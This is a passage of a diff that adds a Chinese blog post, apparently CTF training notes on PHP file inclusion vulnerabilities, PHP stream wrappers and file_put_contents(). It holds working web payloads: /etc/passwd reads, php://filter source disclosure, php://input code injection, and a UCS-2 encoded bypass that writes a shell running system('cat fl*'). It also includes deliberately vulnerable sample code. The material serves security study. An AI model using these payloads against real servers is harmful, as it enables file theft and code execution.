@@ -165,6 +165,557 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/04/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="legend1440">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="拂云观 · legend1440">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/11/04/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">第三章 文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-04 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-04T12:00:00+08:00">2025-11-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-21 01:40:47" itemprop="dateModified" datetime="2026-01-21T01:40:47+08:00">2026-01-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/LuiawEaNhi669LkWNV5cxg9PnOh?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/LuiawEaNhi669LkWNV5cxg9PnOh?from=from_copylink</a></p>
+<h1 id="Week3-4-PHP-文件包含漏洞"><a href="#Week3-4-PHP-文件包含漏洞" class="headerlink" title="[Week3.4]PHP 文件包含漏洞"></a>[Week3.4]PHP 文件包含漏洞</h1><p>**文件包含漏洞 **通常出现在动态⽹⻚中，有时候由于⽹站功能需求，会让前端用户选择要包含的⽂件，</p>
+<p>⽽开发⼈员⼜没有对要包含的⽂件进⾏安全考虑，⽐如：_对传⼊的⽂件名没有经过合理的校验，或者 _</p>
+<p><em>校检被绕过</em>，就导致攻击者可以通过修改⽂件的位置来让后台<em>包含任意⽂件</em>，从⽽导致⽂件包含漏</p>
+<p>洞。</p>
+<p><u>第一天的学习主要包含:文件包含的概述 文件包含的函数 文件包含的分类以及判断服务器类型的办法</u></p>
+<h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><blockquote>
+<p>开发人员常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+</blockquote>
+<p><strong>文件包含漏洞</strong> 通常出现在<em>动态网页</em>中，有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，比如：<em>对传入的文件名没有经过合理的校验，或者校检被绕过</em>，就导致攻击者可以通过修改文件的位置来让后台<em>包含任意文件</em>，从而导致文件包含漏洞。</p>
+<blockquote>
+<p>注意：<em>网上常说的文件读取漏洞、文件下载漏洞均可理解为文件包含漏洞。</em></p>
+</blockquote>
+<p>在 PHP 中常用的文件包含函数有以下四种：</p>
+<ul>
+<li>include()</li>
+</ul>
+<p>找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
+<ul>
+<li>include_once()</li>
+</ul>
+<p>与 <code>include()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<ul>
+<li>require()</li>
+</ul>
+<p>找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
+<h3 id="require-的返回值规则："><a href="#require-的返回值规则：" class="headerlink" title="require()_ 的返回值规则：_"></a><em>require()</em>_ 的返回值规则：_</h3><ol>
+<li><em>若被引入文件</em><strong>仅包含输出代码</strong><em>（如 <strong>echo</strong>、直接文本）：<strong>这些输出会直接打印到浏览器 &#x2F; 终端</strong>，但 <strong>require()</strong> 本身返回 <strong>1</strong>（成功执行的标识）；</em></li>
+<li><em>若被引入文件</em><strong>包含 <strong><strong>return</strong></strong> 语句</strong><em>：<strong>require()</strong> 会返回 <strong>return</strong> 后的值（可是字符串、数组、对象等）；</em></li>
+<li><em>若引入失败（文件不存在等）：直接触发致命错误（<strong>E_COMPILE_ERROR</strong>），脚本终止执行（区别于 <strong>include()</strong> 的警告错误）。</em></li>
+</ol>
+<ul>
+<li>require_once()</li>
+</ul>
+<p>与 <code>require()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<p>当以上 <em>四种函数</em> 参数可控的情况下，我们需要知道以下两点特性，</p>
+<ul>
+<li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。</li>
+<li>若文件内容不符合 PHP 语法规范则会暴漏其源码。</li>
+</ul>
+<p><strong>实现读取文件内容的函数还有很多,可自行查表</strong></p>
+<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><p>在文件包含中，主要分为 <code>本地</code> 和 <code>远程</code> 两种类别，分类取决于所包含文件位置的不同。这两种分类依赖于 <code>php.ini</code> 中的两个配置项，注意对配置进行更改时，注意 <code>On / Off</code> 开头需大写，其次，修改完配置文件后务必要重启 Web 服务，使其配置文件生效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen （默认开启）allow_url_include #（默认关闭，远程文件包含必须开启）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/TLicbbSDDoDdoxxQuWFc71EFnxc.jpeg"></p>
+<p>本地和远程文件包含,文件的地址显示有差异(具体可以查阅 Hello CTF 上面的资料)</p>
+<p>本地:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=/etc/passwd</span><br><span class="line">http://127.0.0.1/?filename=./phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>远程:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=http://loki.la/ReaDME.md</span><br></pre></td></tr></table></figure>
+
+<h2 id="如何判断服务器类型"><a href="#如何判断服务器类型" class="headerlink" title="如何判断服务器类型"></a>如何判断服务器类型</h2><blockquote>
+<p>虽然判断服务器类型的必要性不是很大，因为按照国内比赛的套路来看，题目环境基本为 Linux + Apache，不过还是有必要性说一下思路的。</p>
+</blockquote>
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>可以尝试读取 <code>/etc/passwd</code> 如果可行则代表操作系统为 Linux，反之为 Windows（注意判断不是百分百正确，不排除可控点存在过滤不允许任意文件包含）</p>
+<h3 id="大小写混写"><a href="#大小写混写" class="headerlink" title="大小写混写"></a>大小写混写</h3><p>可以在文件包含读取文件时，利用大小写敏感的特性来判断服务器类型，因为在 Linux 中严格区分大小写，而 Windows 不区分大小写。</p>
+<p>如：在 Windows 下你要包含的文件为 <code>lfi.txt</code>，即使你写成 <code>Lfi.txt</code>、<code>lFi.tXT</code> 等形式也可包含成功。</p>
+<p><u>第二 三天的学习主要包含文件包含协议与 bypass</u></p>
+<h2 id="文件包含协议"><a href="#文件包含协议" class="headerlink" title="文件包含协议"></a>文件包含协议</h2><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><ul>
+<li><strong>条件</strong>：</li>
+<li>allow_url_fopen：不受影响</li>
+<li>allow_url_include：不受影响</li>
+<li><strong>作用</strong>：</li>
+</ul>
+<p>用于访问本地文件系统。</p>
+<ul>
+<li><strong>说明</strong>：</li>
+</ul>
+<p><em>file:&#x2F;&#x2F;</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以&#x2F;、\、\或  Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI  的时候，目录默认是脚本被调用时所在的目录。</p>
+<p>在某些函数里，例如 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， <code>include_path</code> 会可选地搜索，也作为相对的路径。</p>
+<ul>
+<li><strong>用法</strong>：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">file://C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>示例</strong>：</li>
+</ul>
+<p>file:&#x2F;&#x2F;[ 文件的绝对路径和文件名]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Ad6kbR0J2ozaqgxm2gwcH5Yxnne.png"></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><ul>
+<li><strong>条件</strong>：</li>
+<li>allow_url_fopen：不受影响</li>
+<li>allow_url_include：仅 <code>php://input</code>、 <code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code></li>
+<li><strong>作用</strong>：   访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li>
+<li><strong>说明</strong>：   PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li>
+</ul>
+<p><em>中译中：PHP 自带了一批 “现成工具”：有的帮你接外部数据、发数据给外部，有的帮你存临时数据（不用建文件），有的帮你加工数据（读写字节时过滤处理），还有的帮你单独存错误 —— 这些工具统称 “杂项 IO 流”，直接用 <strong>php:&#x2F;&#x2F;xxx</strong> 就能调用，不用自己折腾基础功能。</em></p>
+<h4 id="常见的-php-协议"><a href="#常见的-php-协议" class="headerlink" title="常见的 php 协议"></a>常见的 php 协议</h4><p><em>中译中:</em></p>
+<p><strong>1.php:&#x2F;&#x2F;input</strong><em>“有一个只能读取、不能修改的专用通道，能拿到前端发给 PHP 的‘原汁原味’的请求数据（就是没被 PHP 处理过的原始数据）。但要注意两个前提：</em></p>
+<p><em>如果你开了 PHP 的 <strong>enable_post_data_reading</strong> 这个设置（默认是开的）；</em></p>
+<p><em>前端提交数据时，用的是 <strong>enctype&#x3D;”multipart&#x2F;form-data”</strong> 这种格式（通常用来上传文件、提交带文件的表单）；那这个通道（也就是 <strong>php:&#x2F;&#x2F;input</strong>）就用不了了 —— 读不到任何数据。”</em></p>
+<p><strong>2.php:&#x2F;&#x2F;output</strong><em>“这是一个只能写、不能读的‘数据传送带’，你往上面写内容，就跟用 <strong>print</strong> 或 <strong>echo</strong> 打印东西一样 —— 最终都会送到浏览器 &#x2F; 客户端（比如浏览器显示文字、接口返回数据）。”</em></p>
+<p>_它就是 <strong>echo</strong>&#x2F;<strong>print</strong> 的 “底层载体”：你写 <strong>echo “hello”</strong>，本质就是把 “hello” 放到这个 “传送带” 上，传送带再把内容传给浏览器；_</p>
+<p><em>只能 “写” 不能 “读”：你能往上面丢数据（比如 <strong>echo</strong>、<strong>fwrite</strong> 写内容），但不能从上面拿数据（比如用 <strong>file_get_contents</strong> 读它，会失败）；</em></p>
+<p>举个简单例子：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 echo 打印（本质是往 php://output 写）echo &quot;hello&quot;;</span></span><br><span class="line"><span class="comment">// 直接往 php://output 写，效果和上面完全一样fwrite(fopen(&#x27;php://output&#x27;, &#x27;w&#x27;), &quot;hello&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3.php:&#x2F;&#x2F;fd</strong>_ —— “直接操作文件的‘快捷方式’”_</p>
+<p><em>“从 PHP 5.3.6 开始有这个功能，它允许你直接访问服务器上已经打开的‘文件 &#x2F; 资源的编号’（这个编号叫‘文件描述符’）。比如 <strong>php:&#x2F;&#x2F;fd&#x2F;3</strong>，就对应着服务器上编号为 3 的那个打开的文件 &#x2F; 资源。”</em></p>
+<p><em>先搞懂 “文件描述符”：服务器打开一个文件、网络连接、甚至终端时，会给它分配一个数字编号（比如 0 &#x3D; 标准输入、1 &#x3D; 标准输出、2 &#x3D; 错误输出，3 及以上是自定义的），就像快递的 “取件码”；</em></p>
+<p><em>php:&#x2F;&#x2F;fd&#x2F;取件码</em>_ 就是 “凭取件码直接拿文件”：不用再写文件路径（比如 <strong>&#x2F;var&#x2F;log&#x2F;xxx.log</strong>），直接用编号就能操作已经打开的资源；_</p>
+<p>简单例子（了解即可）：</p>
+<p>比如服务器已经打开了一个日志文件，分配的描述符是 3，你可以直接写：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 往编号3的文件里写日志，不用再打开文件fwrite(fopen(&#x27;php://fd/3&#x27;, &#x27;w&#x27;), &quot;记录一条日志&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4.php:&#x2F;&#x2F;memory 或 php:&#x2F;&#x2F;temp</strong>_ —— “PHP 自带的临时储物箱”_</p>
+<p><strong>原句通俗翻译</strong><em>：“从 PHP 5.1.0 开始有这两个，它们都像‘临时文件夹’，能存数据、取数据（既能读又能写），但不用你手动创建文件、不用删 —— 脚本执行完自动清空。两者的区别就一点：</em></p>
+<p><em>php:&#x2F;&#x2F;memory：把数据全存在‘内存’里（相当于电脑的‘内存条’），读写特别快，但如果数据太大，会占满内存；</em></p>
+<p><em>php:&#x2F;&#x2F;temp：先把数据存内存，等数据超过 2MB（默认限制），就自动转到系统的‘临时文件’里（相当于电脑的‘临时文件夹’），不会占太多内存；你还能自己改内存限制，比如 <strong>php:&#x2F;&#x2F;temp&#x2F;maxmemory:1048576</strong> 就是限制 1MB（1048576 字节 &#x3D; 1MB），超过就存磁盘。”</em></p>
+<p><em>核心理解：</em></p>
+<p><em>用途：临时存数据（比如处理大 CSV、拼接超长字符串、临时缓存数据），不用手动管理文件（不会留下垃圾文件）；</em></p>
+<p><em>怎么选：数据小（比如几 KB、几十 KB）用 <strong>php:&#x2F;&#x2F;memory</strong>（快）；数据可能很大（比如几 MB、几十 MB）用 <strong>php:&#x2F;&#x2F;temp</strong>（不占内存）。</em></p>
+<p>举个常用例子（处理临时数据）：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 php://temp 存临时数据（适合可能很大的数据）</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"><span class="comment">// r+ = 又能读又能写</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$temp</span>, <span class="string">&quot;这是临时数据1\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$temp</span>, <span class="string">&quot;这是临时数据2\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$temp</span>); <span class="comment">// 把“读取指针”移到开头（不然读不到前面写的）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$temp</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 输出：这是临时数据1 这是临时数据2.</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$temp</span>); <span class="comment">// 关闭后，数据自动消失（内存/临时文件都清空）</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>5.php:&#x2F;&#x2F;filter</strong>_ —— “数据的‘预处理加工厂’”_</p>
+<p><strong>原句通俗翻译</strong><em>：“从 PHP 5.0.0 开始有这个‘万能过滤器’，它不是直接存数据或传数据的通道，而是个‘数据加工厂’—— 你读文件、写文件时，能让数据先经过它‘加工’（比如转大写、去空格、解码），再拿到最终结果。尤其适合那些‘一步到位’的文件函数（比如 <strong>readfile()</strong> 直接读文件输出、<strong>file_get_contents()</strong> 直接读文件内容），这些函数本来没机会加工数据，用它就能中途加过滤处理。”</em></p>
+<p><em>本质：“中间处理器”，不直接操作文件 &#x2F; 数据，只在 “数据传输过程中” 做加工；</em></p>
+<p><em>常用场景：读文件时自动转格式、解码、过滤垃圾字符（比如读 Base64 编码的文件，直接解码再读）；</em></p>
+<p><em>用法：把它当成 “前缀”，跟在文件路径前面，比如 <strong>php:&#x2F;&#x2F;filter&#x2F;加工规则&#x2F;resource&#x3D;文件路径</strong>。</em></p>
+<p>举个实用例子（读文件时自动转大写）：</p>
+<p>比如你有个 <code>test.txt</code>，内容是 <code>hello world</code>，想读的时候直接转成大写，不用额外写代码：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 php://filter 做“转大写”处理，再读 test.txt</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.iconv.UTF-8.UTF-8|string.toupper/resource=test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 输出：HELLO WORLD（自动转大写）</span></span><br></pre></td></tr></table></figure>
+
+<p>再比如读 Base64 编码的文件，直接解码：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先Base64解码，再读文件内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=encoded.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 直接输出解码后的原始内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter 参数详解"></a><strong>php:&#x2F;&#x2F;filter 参数详解</strong></h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<h5 id="可用的过滤器列表"><a href="#可用的过滤器列表" class="headerlink" title="可用的过滤器列表"></a><strong>可用的过滤器列表</strong></h5><p>在 CTF 竞赛中常用的为 <code>转换过滤器</code>，在一些极端情况下可以通过 <code>字符串过滤器</code> 实现 bypass，当然这里需要大家了解一下 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，另外其他的过滤器类型详见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+<hr>
+<ul>
+<li><strong>用法</strong>：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 直接读，PHP 代码会被解析php://filter/resource=flag.php# 针对 PHP 文件（常用）php://filter/read=convert.base64-encode/resource=flag.php# 其他字符编码php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php# Rot13php://filter/string.rot13/resource=1.php# php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><h4 id="convert"><a href="#convert" class="headerlink" title="convert"></a><strong>convert</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">            die(&#x27;too young too simple sometimes naive!&#x27;);    </span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure>
+
+<p>把 Base64 和 Rot13 过滤了，根据 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，发现 PHP 支持的字符编码还是挺多的，我们这里随便选择一个进行使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span><br><span class="line">POST: contents=?&lt;hp pystsme&quot;(ac tlf&quot;*;)</span><br></pre></td></tr></table></figure>
+
+<p>关于代码生成，注意 <code>ucs-2</code> 编码的字符串位数一定要是偶数，否则会报错，<code>ucs-4</code> 编码的字符串位数一定要是 4 的倍数，否则会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php system(&quot;cat fl*&quot;);&#x27;);</span><br><span class="line">// ?&lt;hp pystsme&quot;(ac tlf&quot;*;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a><strong>base64</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;?php  highlight_file(__FILE__);</span><br><span class="line">  require($_GET[&#x27;filename&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">// $flag = &#x27;flag&#123;th14_1s_m3_fl4g&#125;&#x27;;</span><br><span class="line">echo &#x27;答案在注释里，自己找吧&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以利用 <code>php://filter</code> 伪协议来读取文件内容，需要注意的是，<code>php://filter</code> 伪协议如果不指定过滤器的话，默认会解析 PHP 代码，所以我们需要指定 <code>convert.base64-encode</code> 过滤器来对文件内容进行编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="file-put-contents-函数介绍"><a href="#file-put-contents-函数介绍" class="headerlink" title="*file_put_contents() 函数介绍"></a><code>*file_put_contents()</code> 函数介绍</h5><p><code>file_put_contents()</code> 是 PHP 中<strong>最简洁的 “写文件” 函数</strong>—— 核心作用是：<strong>把数据直接写入文件</strong>，不用手动打开、关闭文件（底层自动帮你处理），相当于 <code>fopen()</code> + <code>fwrite()</code> + <code>fclose()</code> 三个函数的 “一站式简化版”。</p>
+<p>一句话概括：<strong>“想把字符串、数组、二进制数据（比如图片）写到文件里，用它最方便”</strong>。</p>
+<p><strong>一、基本语法</strong></p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(文件路径, 要写入的数据, 可选参数, 上下文);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>返回值：成功返回写入的字节数；失败返回 <code>false</code>（或 <code>0</code>，取决于数据是否为空）。</p>
+</li>
+<li><p>核心参数（前 2 个必传，后 2 个极少用）：</p>
+<ol>
+<li>文件路径：要写入的文件位置（比如 <code>./test.txt</code>、<code>/var/log/info.log</code>）；</li>
+<li>要写入的数据：支持字符串、数组（会自动拼接成字符串）、二进制数据（比如图片字节）；</li>
+<li>可选参数：比如 <code>FILE_APPEND</code>（追加内容，不覆盖原文件）、<code>LOCK_EX</code>（写文件时加锁，防止多人同时写冲突）；</li>
+<li>上下文：几乎不用（复杂场景才用，比如远程文件）。</li>
+</ol>
+</li>
+</ul>
+<p><strong>二、常用场景示例（直接复制能用）</strong></p>
+<p><strong>场景 1：基础用法 —— 覆盖写入文件（默认行为）</strong></p>
+<p>把字符串直接写入文件，如果文件不存在，会自动创建；如果文件已存在，会覆盖原有内容。</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 要写入的数据（字符串）</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;Hello World！\n这是用 file_put_contents 写的内容&quot;</span>;</span><br><span class="line"><span class="comment">// 写入文件（路径：当前目录下的 test.txt）</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./test.txt&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// 验证是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;写入成功！共写入 <span class="subst">$result</span> 个字节&quot;</span>;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&quot;写入失败（可能是权限不够）&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行后，<code>test.txt</code> 里的内容就是：</li>
+<li>plaintext</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World！</span><br><span class="line">这是用 file_put_contents 写的内容</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景 2：追加内容（不覆盖原文件）</strong></p>
+<p>用 <code>FILE_APPEND</code> 参数，在文件末尾加内容（比如写日志、累加数据）。</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>**<span class="comment">// 要追加的内容（比如一条日志，带时间）</span></span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot; - 用户登录成功\n&quot;</span>;</span><br><span class="line"><span class="comment">// 追加到日志文件（FILE_APPEND 表示“追加”，不是覆盖）</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./user.log&#x27;</span>, <span class="variable">$log</span>, FILE_APPEND);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;日志写入成功&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行多次后，<code>user.log</code> 会累加内容：</li>
+<li>plaintext</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-11-09 10:30:00 - 用户登录成功</span><br><span class="line">2025-11-09 10:35:20 - 用户登录成功</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景 3：写入数组（自动拼接成字符串）</strong></p>
+<p>如果传入数组，函数会自动把数组元素用空字符串拼接成一个字符串写入（数组元素必须是字符串 &#x2F; 数字，不能是对象）。</p>
+<p>php</p>
